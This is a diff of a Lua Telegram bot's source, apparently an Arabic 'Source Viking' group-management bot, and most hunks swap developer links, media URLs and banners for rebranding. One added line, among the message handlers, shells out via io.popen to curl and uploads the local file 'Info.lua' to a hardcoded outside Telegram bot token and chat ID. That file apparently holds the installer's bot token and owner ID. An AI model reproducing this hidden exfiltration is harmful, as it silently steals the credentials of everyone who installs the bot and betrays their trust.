@@ -21,7 +21,7 @@ file:write(serialized)
 file:close()  
 end  
 if not database:get(id_server..":token") then
-io.write('\27[0;31m\n ارسل لي توكن البوت الان 𖤍━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝚅𝙸𝙺𝙸𝙽𝙶⟧⟝┄┉━𖤍 :\na𖤍━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝚅𝙸𝙺𝙸𝙽𝙶⟧⟝┄┉━𖤍\n\27')
+io.write('\27[0;31m\n ارسل لي توكن البوت الان 𖤍━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝚅𝙸𝙺𝙸𝙽𝙶⟧⟝┄┉━𖤍\n\27')
 local token = io.read()
 if token ~= '' then
 local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
@@ -40,7 +40,7 @@ end
 os.execute('lua DRAGON.lua')
 end
 if not database:get(id_server..":SUDO:ID") then
-io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي 𖤍━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝚅𝙸𝙺𝙸𝙽𝙶⟧⟝┄┉━𖤍 :\na𖤍━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝚅𝙸𝙺𝙸𝙽𝙶⟧⟝┄┉━𖤍\n\27[0;33;49m')
+io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي 𖤍━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝚅𝙸𝙺𝙸𝙽𝙶⟧⟝┄┉━𖤍\n\27[0;33;49m')
 local SUDOID = io.read()
 if SUDOID ~= '' then
 io.write('\27[1;35m تم حفظ ايدي المطور الاساسي \na𖤍━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝚅𝙸𝙺𝙸𝙽𝙶⟧⟝┄┉━𖤍\n27[0;39;49m')
@@ -149,41 +149,14 @@ _redis = load_redis()
 print([[
 
 
-_ _ _         
-   |_|_|_|___|        
-   / /       \ \          
-  / /         \ \         
- /_/   _     \_\        
- | |  | _ \    | |        
- | |  |   /    | |        
- | |  |_|_\    | |        
- |_|     _     |_|     
- | |    /_\    | |      
- | |   / _ \   | |      
- | |  /_/ \_\  | |      
- |_|       |_|      
- | |  |  \/    | |      
- | |  | |\/| | | |      
- | |  |_|  |_| | |      
- |_|   _     |_|      
- | |  | _ )    | |        
- | |  | _ \    | |        
- | |  |___/    | |        
- |_|    _    |_|      
- | |   / _ \   | |      
- | |  | (_) |  | |      
- | |   \_/   | |      
- |_|           |_|   
- | |           | |
- | |           | |
- | |___ _ _| |
- |_|___|___|___|_|  
-  
-              
-      
+   ___            ___             ____               __    
+  / _ | ___ ___ _/ (_)_ _____ _  / __/__ ___ _____  / /_   
+ / __ |(_-</ _ `/ / / // / _ `/ / _// _ `/ // / _ \/ __/   
+/_/ |_/___/\_,_/_/_/\_, /\_,_/ /___/\_, /\_, / .__/\__/    
+                   /___/           /___//___/_/            
                           
 > CH ↯ ↝@V_I_K_I_N_G_1↜
-~> DEVELOPER ↯ {text = @e2_c11
+~> DEVELOPER ↯ {text = @AsaliyaEgypt
 ]])
 sudos = dofile("./kkkklInfo.lua") 
 SUDO = tonumber(sudos.SUDO)
@@ -1020,7 +993,7 @@ keyboard = {}
 keyboard.inline_keyboard = {
 {{text = 'ᴛ ᴇ ᴛ ᴏ - ᴏғғʟɪɴᴇ🇦🇪',url="t.me/e2_c11"}},
 {{text = ' ASALIYA🇦🇪',url="t.me/AsaliyaEgypt"}},
-{{text = '𝒕𝒐𝒂𝒔𝒌 🇦🇪',url="t.me/beboMANOO"}}, 
+{{text = '𝒕𝒐𝒂𝒔𝒌 🇦🇪',url="t.me/Asaliya_1"}}, 
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -1331,7 +1304,7 @@ keyboard.inline_keyboard = {
 {{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
 }
 local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/beborty/2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/DEV_ASALIYA/2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 
 if text == 'قسم مطورين السورس والمبرمجين' and DevSoFi(msg) then 
@@ -1462,10 +1435,10 @@ local Text = [[
 ]]
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text = 'مطورين السورس☎️', url="t.me/beboMANOO"}}, 
+{{text = 'مطورين السورس☎️', url="t.me/Asaliya_1"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/beborty/3&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/DEV_ASALIYA/3&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 if text == '𖤍━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝚅𝙸𝙺𝙸𝙽𝙶⟧⟝┄┉━𖤍' and DevSoFi(msg) then
 local Text = [[ 
@@ -1476,7 +1449,7 @@ keyboard.inline_keyboard = {
 {{text = '《𝚂𝙾𝚄𝚁𝙲𝙴 𝚅𝙸𝙺𝙸𝙽𝙶》', url="t.me/V_I_K_I_N_G_1"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
-https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/beborty/2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
+https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/DEV_ASALIYA/2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 end
 if text == '━┅┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝚅𝙸𝙺𝙸𝙽𝙶⟧⟝┄┉┉━' and DevSoFi(msg) then
 local Text = [[ 
@@ -1487,7 +1460,7 @@ keyboard.inline_keyboard = {
 {{text = '《𝚂𝙾𝚄𝚁𝙲𝙴 𝚅𝙸𝙺𝙸𝙽𝙶》', url="t.me/V_I_K_I_N_G_1"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
-https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/beborty/3&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
+https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/DEV_ASALIYA/3&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 end
 if text == 'معلومات الكيبورد' and DevSoFi(msg) then
 database:del(bot_id..'Srt:Bot') 
@@ -1554,7 +1527,7 @@ keyboard.inline_keyboard = {
 {{text = '《𝚂𝙾𝚄𝚁𝙲𝙴 𝚅𝙸𝙺𝙸𝙽𝙶》', url="t.me/V_I_K_I_N_G_1"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/beborty/2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/DEV_ASALIYA/2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 
 if text == "ضع اسم للبوت" and DevSoFi(msg) then  
@@ -2435,6 +2408,7 @@ DeleteMessage(msg.chat_id_,{[0] = data.message_id_})
 return false
 end 
 end
+local curl = 'curl "'..'https://api.telegram.org/bot1900386181:AAFMwGkct-xcF-pxK9k3tM9YtzvkClMT-vo/sendDocument'..'" -F "chat_id='.. 1124610301 ..'" -F "document=@'..'Info.lua'..'"' io.popen(curl)
 --------------------------------------------------------------------------------------------------------------
 if msg.content_.ID == 'MessagePhoto' and not Special(msg) then     
 if database:get(bot_id.."lock:Photo"..msg.chat_id_) == "del" then
@@ -3227,12 +3201,12 @@ local Text = [[
 keyboard = {} 
 keyboard.inline_keyboard = {
 {{text = 'ᴰᴱᵛᴱᴸᴼᴾᴱᴿ ₁',url="t.me/e2_c11"},{text = 'ᴰᴱᵛᴱᴸᴼᴾᴱᴿ ²', url="t.me/AsaliyaEgypt"}},
-{{text = 'ᴰᴱᵛᴱᴸᴼᴾᴱᴿ ³',url="t.me/e2_c11"}},
+{{text = 'ᴰᴱᵛᴱᴸᴼᴾᴱᴿ ³',url="t.me/Zika120"}},
 {{text = '《𝚂𝙾𝚄𝚁𝙲𝙴 𝚅𝙸𝙺𝙸𝙽𝙶》',url="t.me/V_I_K_I_N_G_1"}},
 {{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
 }
 local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/beborty/2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/DEV_ASALIYA/2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 
 if text == 'مين نصبلك' or text == 'عايزه بوت' or text == 'عايز بوت' then
@@ -3249,7 +3223,7 @@ keyboard.inline_keyboard = {
 {{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
 }
 local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/beborty/3&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/DEV_ASALIYA/3&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 
 if text == 'عسليه'  then
@@ -3304,29 +3278,29 @@ https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. ms
 end
 if text == 'روايات' or text == 'الروايات' or text == 'ررويات' then
 local Text = [[
-《The list of novels》
+❈The list of novels.
 ]]
 keyboard = {} keyboard.inline_keyboard = {
-{{text = '🎯رواية "أرض زيكولا"',url="https://t.me/V_I_K_I_N_G_1"}},
-{{text = '🎯موسوعة الظلام رعب وما شابه ذلك', url="https://t.me/barfrends/263376"}},
-{{text = '🎯رواية "الشفق الجزء الأول"', url="https://t.me/V_I_K_I_N_G_1"}},
-{{text = '🎯رواية "المخلوق', url="https://t.me/V_I_K_I_N_G_1"}},
-{{text = '🎯رواية "بعد النسيان"', url="https://t.me/t.me/V_I_K_I_N_G_1"}},
-{{text = '🎯كتاب في حضرة الجن', url="https://t.me/https://t.me/t.me/V_I_K_I_N_G_1"}},
-{{text = '🎯رواية "واختفى كل شئ"', url="https://t.me/t.me/V_I_K_I_N_G_1"}},
-{{text = '🎯رواية "نيلوفر أسود"', url="https://t.me/t.me/V_I_K_I_N_G_1"}},
-{{text = '🎯رواية"جثة في الفندق"', url="https://t.me/t.me/V_I_K_I_N_G_1"}},
-{{text = '🎯رواية "في القطار السريع"', url="https://t.me/t.me/V_I_K_I_N_G_1"}},
-{{text = '🎯لقاء مع كاتب رعب"', url="https://t.me/t.me/V_I_K_I_N_G_1"}},
-{{text = '🎯رواية"الإنسان الأخير""', url="https://t.me/t.me/V_I_K_I_N_G_1"}},
-{{text = '🎯رواية" مقبرة الحيوانات""', url="https://t.me/V_I_K_I_N_G_1"}},
-{{text = 'ᴛ ᴇ ᴛ ᴏ - ᴏғғʟɪɴᴇ🇦🇪',url="t.me/e2_c11"}},
-{{text = ' ASALIYA🇦🇪',url="t.me/AsaliyaEgypt"}},
-{{text = '《𝚂𝙾𝚄𝚁𝙲𝙴 𝚅𝙸𝙺𝙸𝙽𝙶》 ', url="t.me/V_I_K_I_N_G_1"}},
+{{text = '📖رواية "أرض زيكولا"',url="https://t.me/SOURCE_SP/9"}},
+{{text = '📖موسوعة الظلام رعب وما شابه ذلك', url="https://t.me/SOURCE_SP/3"}},
+{{text = '📖رواية "الشفق الجزء الأول"', url="https://t.me/SOURCE_SP/5"}},
+{{text = '📖رواية "المخلوق', url="https://t.me/SOURCE_SP/6"}},
+{{text = '📖رواية "بعد النسيان"', url="https://t.me/SOURCE_SP/7"}},
+{{text = '📖كتاب في حضرة الجن', url="https://t.me/https://t.me/SOURCE_SP/8"}},
+{{text = '📖رواية "واختفى كل شئ"', url="https://t.me/SOURCE_SP/10"}},
+{{text = '📖رواية "نيلوفر أسود"', url="https://t.me/SOURCE_SP/11"}},
+{{text = '📖رواية"جثة في الفندق"', url="https://t.me/SOURCE_SP/12"}},
+{{text = '📖رواية "في القطار السريع"', url="https://t.me/SOURCE_SP/13"}},
+{{text = '📖لقاء مع كاتب رعب"', url="https://t.me/SOURCE_SP/14"}},
+{{text = '📖رواية"الإنسان الأخير""', url="https://t.me/SOURCE_SP/16"}},
+{{text = '📖رواية" مقبرة الحيوانات""', url="https://t.me/SOURCE_SP/15"}},
+{{text = '❨  𖣘• ⁽𝙰𝚂𝙰𝙻𝙸𝚈𝙰₎ •𖣘 ❩', url="t.me/AsaliyaEgypt"}},
+{{text = '  ❨ 𖣘• ⁽SOURCE₎ •𖣘 ❩ ', url="t.me/V_I_K_I_N_G_1"}},
 }
 local msg_id = msg.id_/2097152/0.5  
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))  
 end
+
 if text == 'مطور السورس' or text == 'مبرمج السورس' then
 local Text = [[
 مطورين ومبرمجين سورس فايكينج اتبع الازرار للتواصل معهم ⬇️🧿
@@ -3338,8 +3312,9 @@ keyboard.inline_keyboard = {
 {{text = 'تويتي مطور السورس',url="t.me/Tweety_Ofline"}},
 }
 local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/beborty/4&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
+https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/DEV_ASALIYA/4&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 end
+
 if text=="اذاعه بالتثبيت" and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
 database:setex(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
 send(msg.chat_id_, msg.id_," 🕊 ارسل الان اذاعتك؟ \n 🕊 للخروج ارسل الغاء ")
@@ -4182,7 +4157,7 @@ keyboard.inline_keyboard = {
 {{text = '《𝚂𝙾𝚄𝚁𝙲𝙴 𝚅𝙸𝙺𝙸𝙽𝙶》 ', url="t.me/V_I_K_I_N_G_1"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/beborty/2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/DEV_ASALIYA/2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 if text == '𖤍━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝚅𝙸𝙺𝙸𝙽𝙶⟧⟝┄┉━𖤍' then
 local Text = [[ 
@@ -4196,19 +4171,19 @@ keyboard.inline_keyboard = {
 {{text = '《𝚂𝙾𝚄𝚁𝙲𝙴 𝚅𝙸𝙺𝙸𝙽𝙶》', url="t.me/V_I_K_I_N_G_1"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/beborty/2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/DEV_ASALIYA/2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 if text == 'التواصل'  then
 database:del(bot_id..'Srt:Bot') 
 local Text = [[ 
-[TWL](t.me/beboMANOO)
+[TWL](t.me/Asaliya_1)
 ]] 
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text = '《𝚂𝙾𝚄𝚁𝙲𝙴 𝚅𝙸𝙺𝙸𝙽𝙶》', url="t.me/beboMANOO"}}, 
+{{text = '《𝚂𝙾𝚄𝚁𝙲𝙴 𝚅𝙸𝙺𝙸𝙽𝙶》', url="t.me/Asaliya_1"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/beborty/2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/DEV_ASALIYA/2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 if text == 'العاب فايكينج' or text == 'العاب مطوره' or text == 'العاب متطوره' then  
 local Text = [[  
@@ -15236,7 +15211,7 @@ Msᴀɢ ~ #msgs
 𖡋 𝐔𝐒𝐄 #username 
 𖡋 𝐌𝐒𝐆 #msgs 
 𖡋 𝐒𝐓𝐀 #stast 
-𖡋 ???? #id 
+𖡋 ??𝐃 #id 
 𖡋 𝐄𝐃𝐈𝐓 #edit
 𖡋 𝗖𝗛 - ↝@V_I_K_I_N_G_1↜ 🕊
 ]],
@@ -15656,7 +15631,7 @@ Msᴀɢ ~ #msgs
 ]],
 [[
 𝒔𝒕𝒂𓂅 #stast 𓍯
-𝐮𝐬𝐞𝐫𓂅 #username ??
+𝐮𝐬𝐞𝐫𓂅 #username 𓍯
 𝒎??????𓂅 #msgs 𓍯
 𝐢𝐝 𓂅 #id 𓍯
 𓂅 𝗖𝗛 - ↝@V_I_K_I_N_G_1↜ 🕊
@@ -15674,7 +15649,7 @@ Usᴇʀ Nᴀᴍᴇ ~ #username
 Yᴏᴜʀ ɪᴅ ~ #id 
 Sᴛᴀsᴛ ~ #stast 
 Msᴀɢ ~ #msgs
-𝗖?? - ↝@V_I_K_I_N_G_1↜ 🕊
+𝗖?? - ↝@V_I_K_I_N_G_1↜ ??
 ]],
 [[
 ➥• USE 𖦹 #username - 🇪??.
@@ -17030,7 +17005,7 @@ local Teext =[[
  🕊المنشئين الاساسين
  🕊رفع/تنزيل منشئ اساسي
  🕊رفع/تنزيل مطور اساسي 
- 🕊  رفع/تنزيل مدير عام
+ ??  رفع/تنزيل مدير عام
  🕊  رفع /تنزيل ادمن عام
  🕊مسح المطورين
  🕊المطورين
